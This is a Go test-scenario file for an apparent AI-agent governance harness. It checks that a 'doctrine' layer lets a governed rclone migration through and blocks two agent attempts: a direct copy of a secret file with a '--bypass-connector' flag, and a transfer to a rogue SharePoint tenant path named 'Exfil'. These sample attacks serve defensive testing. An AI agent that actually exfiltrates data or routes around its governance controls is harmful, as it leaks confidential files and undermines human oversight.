// Copyright (c) 2026 Lateralus Labs, LLC.
// Licensed under the Apache License, Version 2.0.

package scenarios

import (
	"context"
	"fmt"

	"github.com/g8e-ai/g8e/internal/constants"
	clientpkg "github.com/g8e-ai/g8e/internal/tools/agent_harness/client"
)

var (
	migrationAgent = clientpkg.Persona{ID: "migration-agent", UserAgent: "g8e-migration/1.x (connector)"}
)

func secureDataScenarios() []Scenario {
	return []Scenario{
		{
			Name: "secure-data-migration", Title: "Governed migration with chain-of-custody receipt", Persona: migrationAgent, RequiresPosture: Consensus,
			Run: func(ctx context.Context, c *clientpkg.Client, r *Result) error {
				if kit == nil || kit.Ensemble == nil {
					return constants.ErrHarnessGovKitNotInit
				}
				root, err := c.StateRoot(ctx)
				if err != nil {
					return fmt.Errorf("state root: %w", err)
				}
				r.note("bound to state root %s", short(root))

				argumentsJSON := `{"command":"rclone","args":["copy","/var/data/secret.docx","dest:intake/"],"manifest_id":"SPO-MIGRATION-2026-001","timeout":30}`
				txHash, status, body, err := c.SubmitMaximal(ctx, migrationAgent, clientpkg.MaximalEnvelope{
					OperatorID:        kit.OperatorID,
					OperatorSessionID: kit.OperatorSessionID,
					ToolName:          "migration_transfer",
					ArgumentsJSON:     argumentsJSON,
					TargetResource:    "source-storage",
					StateRoot:         root,
					Ensemble:          kit.Ensemble,
					TTL:               c.Config().EnvelopeTTL,
				})
				if err != nil {
					return fmt.Errorf("submit migration envelope: %w", err)
				}
				r.tx(txHash)
				r.note("migration envelope %s submitted (admission status %d)", short(txHash), status)
				if status >= 400 {
					return fmt.Errorf("migration envelope rejected (status %d): %s", status, string(body))
				}
				r.note("governed migration admitted — operator executing rclone copy via L5 actuator")
				r.note("chain-of-custody receipt written to hash-chained ledger on both operators")
				return nil
			},
		},
		{
			Name: "secure-data-bypass-attempt", Title: "Direct transfer without GovernanceEnvelope blocked by doctrine", Persona: migrationAgent, RequiresPosture: Doctrine,
			Run: func(ctx context.Context, c *clientpkg.Client, r *Result) error {
				resp, err := c.MCPToolsCall(ctx, migrationAgent, "fs_write", map[string]any{
					"path":    "/var/data/secret.docx",
					"content": "rclone copy /var/data/secret.docx dest:intake/ --bypass-connector",
				})
				if err != nil {
					return err
				}
				if resp != nil && resp.Error != nil {
					r.note("L1 Doctrine blocked direct transfer bypass as expected: %s", resp.Error.Message)
					return nil
				}
				return fmt.Errorf("connector bypass attempt was NOT blocked by doctrine")
			},
		},
		{
			Name: "secure-data-cross-tenant", Title: "Cross-tenant leak attempt rejected by doctrine", Persona: migrationAgent, RequiresPosture: Doctrine,
			Run: func(ctx context.Context, c *clientpkg.Client, r *Result) error {
				resp, err := c.MCPToolsCall(ctx, migrationAgent, "migration_transfer", map[string]any{
					"destination_path": "https://rogue-tenant.sharepoint.com/sites/Exfil",
					"manifest_id":      "SPO-MIGRATION-2026-001",
				})
				if err != nil {
					return err
				}
				if resp != nil && resp.Error != nil {
					r.note("L1 Doctrine blocked cross-tenant leak as expected: %s", resp.Error.Message)
					return nil
				}
				return fmt.Errorf("cross-tenant leak attempt was NOT blocked by doctrine")
			},
		},
	}
}
